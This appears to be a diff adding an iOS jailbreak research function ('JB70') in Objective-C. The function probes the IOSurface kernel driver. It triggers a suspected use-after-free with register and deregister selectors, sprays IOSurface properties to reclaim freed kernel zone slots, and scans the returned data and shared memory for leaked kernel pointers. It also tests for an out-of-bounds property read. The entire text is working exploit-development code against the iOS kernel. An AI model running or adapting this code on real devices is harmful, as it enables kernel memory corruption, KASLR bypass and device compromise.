@@ -47166,3 +47166,432 @@ void iosurface_shmem_timing(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB70: UAF reclaim via IOSurface property spray
+
+void iosurface_uaf_propspray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    isr_reset_stop();
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"JB70: === UAF Reclaim via IOSurface Property Spray ===");
+
+        typedef void*(*ioscrfn)(void*);
+        typedef uint32_t(*iosgidfn)(void*);
+        typedef void*(*iosbasefn)(void*);
+        typedef int(*ioslockfn)(void*, uint32_t);
+        typedef int(*iosunlockfn)(void*, uint32_t, uint32_t*);
+        typedef size_t(*iossizefn)(void*);
+        typedef void(*iossetvalfn)(void*, void*, void*);
+        typedef void*(*ioscopyvalfn)(void*, void*);
+        typedef void(*iosremvalfn)(void*, void*);
+        typedef void*(*ioscopyallvalfn)(void*);
+        typedef int(*iosfn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*iosafn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef void(*cfrel_fn)(void*);
+
+        void *iosfh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        if (!iosfh) {
+            log(@"JB70: ERROR: cannot load IOSurface.framework");
+            results[@"verdict"] = @"NO_FRAMEWORK";
+            done(results);
+            return;
+        }
+
+        ioscrfn sym_create = (ioscrfn)dlsym(iosfh, "IOSurfaceCreate");
+        iosgidfn sym_getid = (iosgidfn)dlsym(iosfh, "IOSurfaceGetID");
+        iossetvalfn sym_setval = (iossetvalfn)dlsym(iosfh, "IOSurfaceSetValue");
+        ioscopyvalfn sym_copyval = (ioscopyvalfn)dlsym(iosfh, "IOSurfaceCopyValue");
+        iosremvalfn sym_remval = (iosremvalfn)dlsym(iosfh, "IOSurfaceRemoveValue");
+        ioscopyallvalfn sym_copyall = (ioscopyallvalfn)dlsym(iosfh, "IOSurfaceCopyAllValues");
+        iosbasefn sym_getbase = (iosbasefn)dlsym(iosfh, "IOSurfaceGetBaseAddress");
+        ioslockfn sym_lock = (ioslockfn)dlsym(iosfh, "IOSurfaceLock");
+        iosunlockfn sym_unlock = (iosunlockfn)dlsym(iosfh, "IOSurfaceUnlock");
+        iossizefn sym_allocsz = (iossizefn)dlsym(iosfh, "IOSurfaceGetAllocSize");
+        cfrel_fn sym_cfr = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+
+        iosfn sym_call = (iosfn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        iosafn sym_async = (iosafn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+
+        log([NSString stringWithFormat:@"JB70: HH0 setval=%p copyval=%p remval=%p copyall=%p",
+             sym_setval, sym_copyval, sym_remval, sym_copyall]);
+
+        // HH0: Create real IOSurface
+        log(@"JB70: --- HH0: Create real IOSurface ---");
+        NSDictionary *sp = @{@"IOSurfaceAllocSize": @(16384)};
+        void *surfRef = sym_create ? sym_create((__bridge void *)sp) : NULL;
+        uint32_t surfID = surfRef && sym_getid ? sym_getid(surfRef) : 0;
+
+        log([NSString stringWithFormat:@"JB70: HH0 surfRef=%p surfID=%u", surfRef, surfID]);
+        results[@"hh0_surfRef"] = [NSString stringWithFormat:@"%p", surfRef];
+        results[@"hh0_surfID"] = @(surfID);
+
+        if (!surfRef || surfID == 0) {
+            results[@"verdict"] = @"NO_SURFACE";
+            done(results);
+            return;
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // Open IOSurface UserClient connection
+        typedef void*(*matchfn)(const char*);
+        typedef int(*getfn)(unsigned int, void*, unsigned int*);
+        typedef int(*openfn)(unsigned int, unsigned int, uint32_t, unsigned int*);
+        typedef int(*closefn)(unsigned int);
+
+        matchfn sym_match = (matchfn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getfn sym_get = (getfn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        openfn sym_open = (openfn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        closefn sym_sc = (closefn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+
+        unsigned int conn = 0;
+        {
+            void *md = sym_match("IOSurfaceRoot");
+            unsigned int svc = 0;
+            int gkr = sym_get(0, md, &svc);
+            int okr = sym_open(svc, mach_task_self(), 0, &conn);
+            log([NSString stringWithFormat:@"JB70: HH0 conn=%u svc=%u gkr=%d okr=0x%x", conn, svc, gkr, okr]);
+        }
+
+        if (!conn) {
+            results[@"verdict"] = @"NO_CONNECTION";
+            if (surfRef && sym_cfr) sym_cfr(surfRef);
+            done(results);
+            return;
+        }
+
+        unsigned int wp = 0;
+        mach_port_allocate(mach_task_self(), 1, &wp);
+
+        // HH1: Verify UAF with real surfID
+        log(@"JB70: --- HH1: UAF with real surfID ---");
+        int hh1_stale = 0;
+        {
+            uint64_t regIn[3] = {surfID, 0x1122334455667788ULL, 0};
+            int r17 = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            int r18 = jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+            int r17b = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+            hh1_stale = (r17 == 0 && r18 == 0 && r17b == 0) ? 1 : 0;
+            log([NSString stringWithFormat:@"JB70: HH1 r17=0x%x r18=0x%x r17b=0x%x stale=%d",
+                 (unsigned)r17, (unsigned)r18, (unsigned)r17b, hh1_stale]);
+
+            jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+            results[@"hh1_stale"] = @(hh1_stale);
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_sc(conn); if (sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // HH2: Property spray — set many small properties to spray kalloc zones
+        log(@"JB70: --- HH2: IOSurface property spray reclaim ---");
+        int hh2_reclaimed = 0;
+        int hh2_kptrs = 0;
+        uint64_t hh2_leaked = 0;
+        {
+            // Phase A: Register + deregister to create UAF slot
+            uint64_t regIn[3] = {surfID, 0xAAAABBBBCCCCDDDDULL, 0};
+            int rA = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            int rB = jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+            log([NSString stringWithFormat:@"JB70: HH2 reg=0x%x dereg=0x%x", (unsigned)rA, (unsigned)rB]);
+
+            // Phase B: Spray IOSurface properties with 24-byte values
+            // Each property key-value creates a kernel allocation
+            if (sym_setval && surfRef) {
+                for (int i = 0; i < 64; i++) {
+                    NSString *key = [NSString stringWithFormat:@"spray_%03d", i];
+                    // 24-byte value: 3 uint64_t matching UAF slot size
+                    uint8_t val[24];
+                    memset(val, 0x41 + (i % 26), 24);
+                    // Encode marker pattern
+                    val[0] = 0xDE;
+                    val[1] = 0xAD;
+                    val[2] = (uint8_t)(i & 0xFF);
+                    NSData *data = [NSData dataWithBytes:val length:24];
+                    sym_setval(surfRef, (__bridge void *)key, (__bridge void *)data);
+                }
+                log(@"JB70: HH2 sprayed 64 properties (24B each)");
+            }
+
+            // Phase C: Try to read stale registration — if reclaimed, we see spray data
+            uint8_t staleOut[256];
+            memset(staleOut, 0, 256);
+            size_t staleSz = 256;
+            uint64_t sOut[4] = {0};
+            uint32_t sOutC = 4;
+            int rC = sym_call(conn, 17, NULL, 0, regIn, 24, sOut, &sOutC, staleOut, &staleSz);
+
+            int nonzero = 0;
+            uint64_t *s64 = (uint64_t *)staleOut;
+            for (int j = 0; j < (int)(staleSz / 8) && j < 32; j++) {
+                if (s64[j] != 0) nonzero++;
+                if (s64[j] > 0xffff000000000000ULL && s64[j] != 0xffffffffffffffffULL) {
+                    hh2_kptrs++;
+                    if (hh2_leaked == 0) hh2_leaked = s64[j];
+                }
+            }
+
+            // Also check scalar outputs
+            for (int j = 0; j < 4; j++) {
+                if (sOut[j] > 0xffff000000000000ULL && sOut[j] != 0xffffffffffffffffULL) {
+                    hh2_kptrs++;
+                    if (hh2_leaked == 0) hh2_leaked = sOut[j];
+                }
+            }
+
+            hh2_reclaimed = (nonzero > 0) ? 1 : 0;
+
+            log([NSString stringWithFormat:@"JB70: HH2 rC=0x%x staleSz=%zu nonzero=%d kptrs=%d s0=0x%llx s1=0x%llx",
+                 (unsigned)rC, staleSz, nonzero, hh2_kptrs, s64[0], s64[1]]);
+
+            // Cleanup registration
+            jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+
+            results[@"hh2_reclaimed"] = @(hh2_reclaimed);
+            results[@"hh2_kptrs"] = @(hh2_kptrs);
+            if (hh2_leaked) results[@"hh2_leaked"] = [NSString stringWithFormat:@"0x%llx", hh2_leaked];
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_sc(conn); if (sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // HH3: Cross-surface spray — create multiple surfaces, use properties for zone pressure
+        log(@"JB70: --- HH3: Multi-surface property spray ---");
+        int hh3_kptrs = 0;
+        uint64_t hh3_leaked = 0;
+        {
+            // Create 8 additional surfaces for zone pressure
+            void *extraSurfs[8] = {0};
+            uint32_t extraIDs[8] = {0};
+            for (int i = 0; i < 8; i++) {
+                NSDictionary *xsp = @{@"IOSurfaceAllocSize": @(4096)};
+                extraSurfs[i] = sym_create((__bridge void *)xsp);
+                extraIDs[i] = extraSurfs[i] ? sym_getid(extraSurfs[i]) : 0;
+            }
+            log([NSString stringWithFormat:@"JB70: HH3 created %u extra surfaces (IDs %u-%u)",
+                 8, extraIDs[0], extraIDs[7]]);
+
+            // UAF: register on main surface, deregister
+            uint64_t regIn[3] = {surfID, 0xBEEFCAFE12345678ULL, 0};
+            jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+
+            // Spray properties on ALL surfaces (main + extra) to maximize zone pressure
+            if (sym_setval) {
+                for (int s = 0; s < 8; s++) {
+                    if (!extraSurfs[s]) continue;
+                    for (int i = 0; i < 32; i++) {
+                        NSString *key = [NSString stringWithFormat:@"x%d_%03d", s, i];
+                        // Try different sizes: 16, 24, 32, 48 bytes
+                        int sizes[] = {16, 24, 32, 48};
+                        int sz = sizes[i % 4];
+                        uint8_t val[48];
+                        memset(val, 0, 48);
+                        val[0] = 0xCA;
+                        val[1] = 0xFE;
+                        val[2] = (uint8_t)s;
+                        val[3] = (uint8_t)i;
+                        NSData *data = [NSData dataWithBytes:val length:sz];
+                        sym_setval(extraSurfs[s], (__bridge void *)key, (__bridge void *)data);
+                    }
+                }
+                log(@"JB70: HH3 sprayed 256 properties across 8 surfaces");
+            }
+
+            // Read stale
+            uint8_t staleOut[256];
+            memset(staleOut, 0, 256);
+            size_t staleSz = 256;
+            uint64_t sOut[4] = {0};
+            uint32_t sOutC = 4;
+            int rD = sym_call(conn, 17, NULL, 0, regIn, 24, sOut, &sOutC, staleOut, &staleSz);
+
+            uint64_t *s64 = (uint64_t *)staleOut;
+            int nonzero = 0;
+            for (int j = 0; j < (int)(staleSz / 8) && j < 32; j++) {
+                if (s64[j] != 0) nonzero++;
+                if (s64[j] > 0xffff000000000000ULL && s64[j] != 0xffffffffffffffffULL) {
+                    hh3_kptrs++;
+                    if (hh3_leaked == 0) hh3_leaked = s64[j];
+                }
+            }
+            for (int j = 0; j < 4; j++) {
+                if (sOut[j] > 0xffff000000000000ULL && sOut[j] != 0xffffffffffffffffULL) {
+                    hh3_kptrs++;
+                    if (hh3_leaked == 0) hh3_leaked = sOut[j];
+                }
+            }
+
+            log([NSString stringWithFormat:@"JB70: HH3 rD=0x%x nonzero=%d kptrs=%d s0=0x%llx s1=0x%llx",
+                 (unsigned)rD, nonzero, hh3_kptrs, s64[0], s64[1]]);
+
+            jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+
+            // Cleanup extra surfaces
+            for (int i = 0; i < 8; i++) {
+                if (extraSurfs[i] && sym_cfr) sym_cfr(extraSurfs[i]);
+            }
+
+            results[@"hh3_kptrs"] = @(hh3_kptrs);
+            if (hh3_leaked) results[@"hh3_leaked"] = [NSString stringWithFormat:@"0x%llx", hh3_leaked];
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_sc(conn); if (sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // HH4: CopyAllValues — read all properties, look for kernel data leaking through
+        log(@"JB70: --- HH4: CopyAllValues kernel data check ---");
+        int hh4_kptrs = 0;
+        uint64_t hh4_leaked = 0;
+        {
+            if (sym_copyall && surfRef) {
+                void *allVals = sym_copyall(surfRef);
+                if (allVals) {
+                    NSDictionary *dict = (__bridge NSDictionary *)allVals;
+                    int totalKeys = (int)[dict count];
+                    log([NSString stringWithFormat:@"JB70: HH4 allVals keys=%d", totalKeys]);
+
+                    for (NSString *key in dict) {
+                        id val = dict[key];
+                        if ([val isKindOfClass:[NSData class]]) {
+                            NSData *d = (NSData *)val;
+                            const uint8_t *bytes = (const uint8_t *)[d bytes];
+                            int len = (int)[d length];
+                            uint64_t *w64 = (uint64_t *)bytes;
+                            for (int j = 0; j < len / 8; j++) {
+                                if (w64[j] > 0xffff000000000000ULL && w64[j] != 0xffffffffffffffffULL) {
+                                    hh4_kptrs++;
+                                    if (hh4_leaked == 0) hh4_leaked = w64[j];
+                                    log([NSString stringWithFormat:@"JB70: HH4 KPTR key=%@ off=%d val=0x%llx", key, j*8, w64[j]]);
+                                }
+                            }
+                        }
+                    }
+                    sym_cfr(allVals);
+                } else {
+                    log(@"JB70: HH4 copyAll returned NULL");
+                }
+            }
+            results[@"hh4_kptrs"] = @(hh4_kptrs);
+            if (hh4_leaked) results[@"hh4_leaked"] = [NSString stringWithFormat:@"0x%llx", hh4_leaked];
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_sc(conn); if (sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // HH5: Shared memory UAF readback — write pattern to shmem, do UAF, check if kernel
+        // corrupted the shared memory mapping
+        log(@"JB70: --- HH5: Shared memory corruption check ---");
+        int hh5_corrupted = 0;
+        {
+            if (sym_getbase && sym_lock && sym_unlock) {
+                uint32_t seed = 0;
+                sym_lock(surfRef, 3);
+                void *base = sym_getbase(surfRef);
+
+                if (base) {
+                    // Write known pattern
+                    uint64_t *p = (uint64_t *)base;
+                    for (int i = 0; i < 256; i++) {
+                        p[i] = 0x4141414141414141ULL + (uint64_t)i;
+                    }
+
+                    sym_unlock(surfRef, 3, &seed);
+
+                    // Do rapid UAF cycles to trigger potential kernel corruption of shmem
+                    for (int cycle = 0; cycle < 10; cycle++) {
+                        uint64_t regIn[3] = {surfID, 0xDEAD000000000000ULL + (uint64_t)cycle, 0};
+                        jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+                        jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+                    }
+
+                    // Check if pattern was corrupted
+                    sym_lock(surfRef, 1);
+                    base = sym_getbase(surfRef);
+                    if (base) {
+                        uint64_t *q = (uint64_t *)base;
+                        int modified = 0;
+                        uint64_t first_mod = 0;
+                        for (int i = 0; i < 256; i++) {
+                            uint64_t expected = 0x4141414141414141ULL + (uint64_t)i;
+                            if (q[i] != expected) {
+                                modified++;
+                                if (first_mod == 0) first_mod = q[i];
+                                if (q[i] > 0xffff000000000000ULL && q[i] != 0xffffffffffffffffULL) {
+                                    hh5_corrupted++;
+                                }
+                            }
+                        }
+                        log([NSString stringWithFormat:@"JB70: HH5 modified=%d corrupted_kptr=%d first_mod=0x%llx",
+                             modified, hh5_corrupted, first_mod]);
+                    }
+                    sym_unlock(surfRef, 1, &seed);
+                } else {
+                    log(@"JB70: HH5 base=NULL");
+                }
+            }
+            results[@"hh5_corrupted"] = @(hh5_corrupted);
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_sc(conn); if (sym_cfr) sym_cfr(surfRef); done(results); return; }
+
+        // HH6: Property-based OOB read — set large property then read with wrong size expectations
+        log(@"JB70: --- HH6: Property size confusion ---");
+        int hh6_extra = 0;
+        uint64_t hh6_leaked = 0;
+        {
+            if (sym_setval && sym_copyval && surfRef) {
+                // Set a property with specific size
+                uint8_t smallVal[8] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22};
+                NSData *d = [NSData dataWithBytes:smallVal length:8];
+                NSString *key = @"oob_test";
+                sym_setval(surfRef, (__bridge void *)key, (__bridge void *)d);
+
+                // Read it back — check if more data is returned than stored
+                void *readBack = sym_copyval(surfRef, (__bridge void *)key);
+                if (readBack) {
+                    NSData *rd = (__bridge NSData *)readBack;
+                    int readLen = (int)[rd length];
+                    const uint8_t *rb = (const uint8_t *)[rd bytes];
+
+                    if (readLen > 8) {
+                        hh6_extra = readLen - 8;
+                        uint64_t *w = (uint64_t *)rb;
+                        for (int j = 1; j < readLen / 8; j++) {
+                            if (w[j] > 0xffff000000000000ULL && w[j] != 0xffffffffffffffffULL) {
+                                hh6_leaked = w[j];
+                            }
+                        }
+                    }
+
+                    log([NSString stringWithFormat:@"JB70: HH6 wrote=8 read=%d extra=%d b0=0x%02x%02x%02x%02x",
+                         readLen, hh6_extra, rb[0], rb[1], rb[2], rb[3]]);
+                    sym_cfr(readBack);
+                } else {
+                    log(@"JB70: HH6 copyVal returned NULL");
+                }
+            }
+            results[@"hh6_extra"] = @(hh6_extra);
+            if (hh6_leaked) results[@"hh6_leaked"] = [NSString stringWithFormat:@"0x%llx", hh6_leaked];
+        }
+
+        // Verdict
+        int total_kptrs = hh2_kptrs + hh3_kptrs + hh4_kptrs + hh5_corrupted;
+        uint64_t best_leak = hh2_leaked ? hh2_leaked : (hh3_leaked ? hh3_leaked : (hh4_leaked ? hh4_leaked : 0));
+        NSString *verdict = @"NO_LEAK";
+        if (total_kptrs > 0) {
+            verdict = [NSString stringWithFormat:@"KPTR_%d_leak_0x%llx", total_kptrs, best_leak];
+        } else if (hh2_reclaimed) {
+            verdict = @"RECLAIMED_NO_KPTR";
+        } else if (hh6_extra > 0) {
+            verdict = [NSString stringWithFormat:@"OOB_READ_%d", hh6_extra];
+        } else {
+            verdict = [NSString stringWithFormat:@"NO_LEAK_surf_%u", surfID];
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB70: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB70-propspray-checkpoint.json", results);
+
+        jb41_dropPort(wp);
+        sym_sc(conn);
+        if (surfRef && sym_cfr) sym_cfr(surfRef);
+        done(results);
+    });
+}
